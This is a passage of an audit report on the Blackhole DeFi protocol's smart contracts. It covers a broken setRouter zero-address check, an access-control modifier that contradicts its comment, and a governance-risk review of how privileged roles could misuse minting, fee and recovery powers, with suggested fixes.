<h3 style="position:relative;" id="recommended-mitigation-steps-31"><a class="anchor before" aria-label="recommended mitigation steps 31 permalink" href="#recommended-mitigation-steps-31"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Add a <code>transferOwnership()</code> hook that also resets or revalidates sensitive roles (like fee recipient).</p>
<h2 style="position:relative;" id="09-incorrect-setrouter-function-only-allows-zero-address-to-pass"><a class="anchor before" aria-label="09 incorrect setrouter function only allows zero address to pass permalink" href="#09-incorrect-setrouter-function-only-allows-zero-address-to-pass"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[09] Incorrect <code>setRouter</code> function only allows zero address to pass</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L313">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L313</a></p>
<h3 style="position:relative;" id="finding-description-20"><a class="anchor before" aria-label="finding description 20 permalink" href="#finding-description-20"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>In the GenesisPoolManager.sol contract, the <code>setRouter</code> function has a logic flaw. </p>
<pre data-index="84" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setRouter</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_router</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_router</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZA"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">router</span><span class="mtk1"> = </span><span class="mtk12">_router</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This means the function only allows setting the router address to zero, which is usually the opposite of the intended behavior.</p>
<h3 style="position:relative;" id="impact-20"><a class="anchor before" aria-label="impact 20 permalink" href="#impact-20"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>The owner may never be able to set a valid router.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-32"><a class="anchor before" aria-label="recommended mitigation steps 32 permalink" href="#recommended-mitigation-steps-32"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Corrected code:</p>
<pre data-index="85" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setRouter</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_router</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_router</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZA"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">router</span><span class="mtk1"> = </span><span class="mtk12">_router</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h2 style="position:relative;" id="10-misaligned-access-control-on-settopnpools-function"><a class="anchor before" aria-label="10 misaligned access control on settopnpools function permalink" href="#10-misaligned-access-control-on-settopnpools-function"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[10] Misaligned access control on <code>setTopNPools()</code> function</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/SetterTopNPoolsStrategy.sol#L46">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/SetterTopNPoolsStrategy.sol#L46</a></p>
<h3 style="position:relative;" id="finding-description-21"><a class="anchor before" aria-label="finding description 21 permalink" href="#finding-description-21"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>setTopNPools</code> function is responsible for updating the list of top N pool addresses in the protocol:</p>
<pre data-index="86" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk3">// Allows either the owner or the AVM to update top pools</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setTopNPools</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_poolAddresses</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyExecutor</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_poolAddresses</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> &lt;= </span><span class="mtk12">topN</span><span class="mtk1">, </span><span class="mtk8">"Exceeds topN"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">delete</span><span class="mtk1"> </span><span class="mtk12">topNPools</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">_poolAddresses</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_poolAddresses</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">] != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Zero address not allowed"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">topNPools</span><span class="mtk1">.</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk12">_poolAddresses</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">TopNPoolsUpdated</span><span class="mtk1">(</span><span class="mtk12">_poolAddresses</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>As per the comment, the function is intended to be callable by either the contract owner or the AVM. However, it is protected by the <code>onlyExecutor</code> modifier:</p>
<pre data-index="87" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">modifier</span><span class="mtk1"> </span><span class="mtk11">onlyExecutor</span><span class="mtk1">() {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">executor</span><span class="mtk1">, </span><span class="mtk8">"Only AVM can call"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This restricts access exclusively to the executor address, which is described as the AVM. <strong>The contract owner is not authorized to call this function, despite the comment stating otherwise.</strong></p>
<h3 style="position:relative;" id="impact-21"><a class="anchor before" aria-label="impact 21 permalink" href="#impact-21"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Violation of Intended Access Control: The contract comment suggests that both the owner and the AVM (executor) should be allowed to update top pools. However, the current implementation violates this expectation.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-33"><a class="anchor before" aria-label="recommended mitigation steps 33 permalink" href="#recommended-mitigation-steps-33"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Change the access control modifier on <code>setTopNPools</code> from <code>onlyExecutor</code> to <code>onlyOwnerOrExecutor</code> to align with the intended permissions.</p>
<h2 style="position:relative;" id="11-governancecentralization-risks-21-contracts-covered"><a class="anchor before" aria-label="11 governancecentralization risks 21 contracts covered permalink" href="#11-governancecentralization-risks-21-contracts-covered"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[11] Governance/centralization Risks (21 contracts covered)</h2>
<h3 style="position:relative;" id="rolesactors-in-the-system"><a class="anchor before" aria-label="rolesactors in the system permalink" href="#rolesactors-in-the-system"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Roles/Actors in the system</h3>
<table>
<thead>
<tr>
<th></th>
<th>Contract</th>
<th>Roles/Actors</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.</td>
<td>Black.sol</td>
<td>Minter</td>
</tr>
<tr>
<td>2.</td>
<td>BlackClaims.sol</td>
<td>Owner/Second Owner</td>
</tr>
<tr>
<td>3.</td>
<td>BlackGovernor.sol</td>
<td>- Minter<br> - Team</td>
</tr>
<tr>
<td>4.</td>
<td>Bribes.sol</td>
<td>- Owner<br>- Voter<br>- GaugeManager<br>- Minter<br>- Avm</td>
</tr>
<tr>
<td>5.</td>
<td>CustomPoolDeployer.sol</td>
<td>- Owner<br> - Authorized</td>
</tr>
<tr>
<td>6.</td>
<td>CustomToken.sol</td>
<td>Owner</td>
</tr>
<tr>
<td>7.</td>
<td>Fan.sol</td>
<td>Owner</td>
</tr>
<tr>
<td>8.</td>
<td>GaugeExtraRewarder.sol</td>
<td>- Owner<br> - GAUGE</td>
</tr>
<tr>
<td>9.</td>
<td>GaugeManager.sol</td>
<td>- Owner<br>- GaugeAdmin<br>- Governance</td>
</tr>
<tr>
<td>10.</td>
<td>GaugeV2.sol</td>
<td>- Owner<br>- genesisManager</td>
</tr>
<tr>
<td>11.</td>
<td>GenesisPool.sol</td>
<td>- genesisManager</td>
</tr>
<tr>
<td>12.</td>
<td>GenesisPoolManager.sol</td>
<td>- Owner<br>- Governance</td>
</tr>
<tr>
<td>13.</td>
<td>MinterUpgradable.sol</td>
<td>Team</td>
</tr>
<tr>
<td>14.</td>
<td>PermissionsRegistry.sol</td>
<td>blackMultisig</td>
</tr>
<tr>
<td>15.</td>
<td>RewardsDistributor.sol</td>
<td>Owner</td>
</tr>
<tr>
<td>16.</td>
<td>RouterV2.sol</td>
<td>Owner</td>
</tr>
<tr>
<td>17.</td>
<td>SetterTopNPoolsStrategy.sol</td>
<td>- Owner<br> - Executor</td>
</tr>
<tr>
<td>18.</td>
<td>Thenian.sol</td>
<td>Owner</td>
</tr>
<tr>
<td>19.</td>
<td>TokenHandler.sol</td>
<td>- Governance<br> - GenesisManager</td>
</tr>
<tr>
<td>20.</td>
<td>VoterV3.sol</td>
<td>- Owner<br>- VoterAdmin<br>- Governance<br>- GenesisManager</td>
</tr>
<tr>
<td>21.</td>
<td>VotingEscrow.sol</td>
<td>- Voter<br>- Team</td>
</tr>
</tbody>
</table>
<h3 style="position:relative;" id="powers-of-each-role-along-with-their-risks"><a class="anchor before" aria-label="powers of each role along with their risks permalink" href="#powers-of-each-role-along-with-their-risks"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Powers of each role (along with their risks)</h3>
<p><strong>1. In the Black.sol contract</strong></p>
<ul>
<li>
<p><strong>Minter:</strong> The minter role in the Black token contract holds critical authority over the token’s supply lifecycle. Initially assigned to the contract deployer, the minter can perform a one-time <code>initialMint()</code> of 50 million tokens to any specified address, as well as mint arbitrary token amounts at any point via the <code>mint()</code> function. This role can also be reassigned to another address using the <code>setMinter()</code> function. Here’s how he can misuse his powers:</p>
<ul>
<li>Inflation attack: The minter can call <code>mint</code> (address, amount) to mint unlimited new tokens to any address. This would inflate the total supply, devalue user holdings.</li>
<li>Mint and dump attack: The minter could mint large amounts of tokens to their own address and immediately dump them on the market.This would crash the token price and exploit unsuspecting holders.</li>
<li>Secretly mint tokens to their own account:  If this role is misused or compromised, the minter could secretly mint large amounts of BLACK tokens to their own address.</li>
<li>Permanently lose the minter role: The <code>setMinter()</code> function currently does not have an <code>address(0)</code> check , this can lead to the minter to set the new minter’s address as <code>0x0</code>. Hence, permanently losing the minter role. This would lead to the protocol to redeploy contracts again.</li>
</ul>
</li>
</ul>
<p><strong>2. In the BlackClaims.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner/Second Owner:</strong> The owner has the ability to recoverERC20 tokens, set treasury, start a season, <code>revokeUnclaimedReward</code>, finalize a season, <code>extendClaimDuration</code>, report rewards and renounce ownership. This contract allows two owners to handle these functionalities. Here’s how any one of them or potentially both misuse their powers:</p>
<ul>
<li>One owner can renounce ownership of the other: However, a potential security risk arises if one of the owner’s private keys is compromised. In such a scenario, the malicious actor could use the compromised key to call the <code>setOwner2()</code> function and change the second owner’s address to one under their control. This effectively grants full control to the attacker, bypassing the intended dual-ownership security model.</li>
<li>May not ever recoverERC20 tokens: A malicious owner can just not call the <code>recoverERC20()</code> function, having the tokens locked in BlackClaims contract forever.</li>
<li>Set treasury’s address to himself/or to an <code>address(0x0)</code>: The owner can claim all the unclaimed rewards of the season, and potentially send it to “his” treasury address, Moreover, the <code>setTreasury()</code> function lacks an <code>address(0x0)</code> check, the malicious owner can potentially set an treasury to <code>address(0x0)</code> and call the <code>revokeUnclaimedReward()</code> function which will lead to the tokens to be permanently locked/lost.</li>
<li>Set the start time of a Season very high: The <code>startSeason()</code> function allows the owner to set the start time of a reward season without any upper limit or sanity check on the provided timestamp. A malicious or compromised owner could abuse this by setting the start time far into the future (e.g., 100 years ahead), effectively preventing the season from ever beginning.</li>
<li>Set treasury to <code>address(0x0)</code> and call <code>revokeUnclaimedReward()</code>: The malicious or compromised owner can call set the treasury to <code>address(0x0)</code> and then call the <code>revokeUnclaimedReward()</code> function, permanently loosing the funds.</li>
<li>Never finalize a season: The finalize function already holds solid checks; however, there can still be a misuse of a owner to never potentially finalize a season.</li>
<li>Extend claim duration to so high that the season never finalizes: The <code>extendClaimDuration()</code> function lacks checks to see if the claim duration amount is in bounds or not, the malicious or compromised owner can extend the claim duration to so high that finalization of a season will be impossible. Even if the compromised owner key is retained back to its original owner there is nothing that can be done.</li>
<li>Risk of reward censorship: The <code>reportRewards()</code> function only updates the rewards for the addresses explicitly passed in, a malicious or biased owner could intentionally omit certain players from the <code>players_</code> array. As a result, those omitted players would not receive their rightful rewards, even if they earned them during the season. This introduces a risk of reward censorship.</li>
</ul>
</li>
</ul>
<p><strong>3. In the In the BlackGovernor.sol contract</strong></p>
<ul>
<li><strong>Minter:</strong> The Minter role in the BlackGovernor contract is a role assigned to a smart contract. Since the role is assigned to a contract (predefined methods), no governance manipulation may be possible for this role.</li>
<li>
<p><strong>Team:</strong> The team role has the ability to set a proposal numerator and renounce its ownership to someone else. Here’s how a user with a team role can misuse his powers:</p>
<ul>
<li>Set proposal numerator to zero: The malicious or compromised user with team role can set the proposal numerator to zero, potentially allowing anyone to propose even with 0 votes.</li>
</ul>
</li>
</ul>
<p><strong>4. In the Bribes.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> In the Bribes contract, the owner has the ability to set a new Voting, GaugeManager, AVM addresses. He also has the power over <code>recoverERC20AndUpdateData()</code> and <code>emergencyRecoverERC20()</code> functions. Here’s how he can misuse his powers:</p>
<ul>
<li>Set malicious contracts: The owner can assign malicious contract addresses for the voter, <code>gaugeManager</code>, <code>bribeFactory</code>, or AVM; such that it benefits him, enabling backdoors or unauthorized control. These contracts could be programmed to redirect fees, manipulate votes, or extract value from user interactions — disguised as legitimate protocol behavior, but actually benefiting the malicious owner.</li>
<li>Steal rewards in the guise of recovery: The <code>onlyAllowed</code> role can invoke this function to withdraw arbitrary ERC20 tokens from the contract. They could manipulate reward accounting by subtracting <code>tokenAmount</code> from the <code>tokenRewardsPerEpoch</code>, under-reporting actual rewards. This allows them to steal reward withdraw tokens meant for user rewards under the guise of “recovery”. Potentially few, or many users, might not receive their rewards, as it has been taken by the owner by the guise of recovery.</li>
</ul>
</li>
<li><strong>Voter:</strong> No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).</li>
<li><strong>GaugeManager:</strong> No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).</li>
<li><strong>Minter:</strong> No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).</li>
<li><strong>Avm</strong>: No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).</li>
</ul>
<p><strong>5. In the CustomPoolDeployer.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to <code>addAuthorizedAccount</code>, <code>removeAuthorizedAccount</code>, <code>setPluginForPool</code>, <code>setPlugin</code>, <code>setPluginConfig</code>, <code>setFee</code>, <code>setCommunityFee</code>, <code>setAlgebraFeeRecipient</code>, <code>setAlgebraFeeManager</code>, <code>setAlgebraFeeShare</code>, <code>setAlgebraFarmingProxyPluginFactory</code>, <code>setAlgebraFactory</code>, <code>setAlgebraPluginFactory</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>Backdoor privilege escalation via <code>addAuthorizedAccount</code>: The owner can maliciously add multiple alternate EOA addresses or smart contracts as authorized accounts, effectively creating hidden backdoors for retaining control. These authorized entities could automate harmful actions such as setting high fees, bypassing restrictions, or manipulating internal state. Even after ownership is transferred, the previous owner may still retain access through these accounts and manipulate functions which are still accessible to the authorized accounts. While a <code>removeAuthorizedAccount</code> function exists, the cleanup burden falls entirely on the new owner, who must manually revoke each account — a tedious process if many were pre-added.</li>
<li>Fee manipulation via <code>setFee()</code>: A malicious owner can exploit the <code>setFee()</code> function to assign excessively high fees to a pool. This would result in an unfairly large portion of each user transaction being taken as fees, effectively discouraging usage, draining user value.</li>
<li>Deploy and set malicious factories: The owner could deploy malicious versions of these factories that generate contracts with backdoors or vulnerabilities. For example: farming Plugin Factory could redirect user rewards to the owner’s address, Algebra Factory could deploy pools with manipulated fee logic or ownership traps, Plugin Factory could enable unauthorized access or data leakage.</li>
</ul>
</li>
<li>
<p><strong>Authorized:</strong> The Authorized role has the ability to <code>setPluginForPool</code>, <code>setPlugin</code>, <code>setPluginConfig</code>, <code>setFee</code>, <code>setCommunityFee</code>. Here’s how a user with a Authorized role can misuse his power:</p>
<ul>
<li>Set high community fees: The protocol does not implement a cap on fees, allowing the malicious or compromised authorized role to set high fees. This does not pose much risk since the owner can just take away the authorized role from the user and set the fees properly again. However, if the owner is malicious or compromised then it’s a different scenario.</li>
</ul>
</li>
</ul>
<p><strong>6. In the CustomToken.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to mint and burn tokens from an account, Here’s how he can misuse his powers:</p>
<ul>
<li>Mint a large sum: The owner can mint a large sum into a random account to inflate the value of the token. He can even mint tokens to his personal account to have more value.</li>
<li>Burn a large sum: The owner can exploit the mint and burn functions to manipulate token supply and market value. For example, the owner could burn a significant number of tokens from user accounts to reduce total supply, artificially inflating the token’s value. Simultaneously, the owner could mint a large number of tokens to their own account, allowing them to benefit from the deflationary effect they induced.</li>
</ul>
</li>
</ul>
<p><strong>7. In the Fan.sol contract</strong> - <em>Note: Same as CustomToken contract (see number 6 above.)</em></p>
<p><strong>8. In the GaugeExtraRewarder.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to <code>recoverERC20</code> and <code>setDistributionRate</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>Set an extremely low amount in <code>setDistributionRate</code>: A compromised or malicious owner can deliberately set the reward amount very low, causing the distribution rate to slow down significantly and resulting in reduced rewards that may frustrate or disincentivize users.</li>
<li>Break reward mechanism: The owner can call <code>recoverERC20</code> to withdraw any ERC20 token held by the contract, including the <code>rewardToken</code>. Even though there is a check to limit withdrawal of the <code>rewardToken</code> to the not-yet-distributed amount, the owner can still  withdraw tokens that users expect as rewards; with potential to reduce or disrupt user rewards by withdrawing tokens from the contract.</li>
</ul>
</li>
<li><strong>GAUGE:</strong> No governance manipulation possible for this role since its a smart contract (predefined methods).</li>
</ul>
<p><strong>9. In the GaugeManager.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to set the Avm address. Here’s how he can misuse his powers:</p>
<ul>
<li>Set a malicious contract to benefit himself: A compromised or  malicious Owner sets avm to a contract that looks like a voting escrow manager but has hidden backdoors. This malicious AVM could potentially divert locked tokens to the owner.</li>
